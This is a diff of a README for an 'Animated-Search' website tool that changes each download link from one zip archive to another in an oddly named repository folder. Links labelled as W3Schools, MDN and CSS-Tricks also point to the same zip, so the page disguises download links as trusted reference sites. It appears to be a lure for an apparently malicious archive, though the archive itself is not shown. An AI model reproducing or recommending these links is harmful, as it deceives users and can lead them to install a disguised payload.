@@ -6,7 +6,7 @@ Welcome to **Animated-Search**! This tool gives your website a smooth and intera
 
 ## 📥 Download Now
 
-[![Download Animated-Search](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip%20Animated--Search-v1.0-brightgreen)](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip)
+[![Download Animated-Search](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip%20Animated--Search-v1.0-brightgreen)](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip)
 
 ## 📜 Overview
 
@@ -32,7 +32,7 @@ Follow these steps to integrate **Animated-Search** into your website.
 
 1. **Download the Software**
    - Visit the Releases page to download:
-   [Download Animated-Search](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip)
+   [Download Animated-Search](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip)
 
 2. **Unzip the Package**
    - After downloading, unzip the file to your preferred location.
@@ -51,15 +51,15 @@ Follow these steps to integrate **Animated-Search** into your website.
 
 You can easily download **Animated-Search** from the Releases page. Click below for the easy download:
 
-[Download Animated-Search](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip)
+[Download Animated-Search](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip)
 
 ## 📚 Additional Resources
 
 For more knowledge on HTML, CSS, and JavaScript, consider the following:
 
-- [W3Schools](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip)
-- [Mozilla Developer Network (MDN)](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip)
-- [CSS-Tricks](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated-Search-v2.6.zip)
+- [W3Schools](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip)
+- [Mozilla Developer Network (MDN)](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip)
+- [CSS-Tricks](https://raw.githubusercontent.com/star890/Animated-Search/main/undisinheritable/Animated_Search_1.7.zip)
 
 ## 🤝 Contributing
 
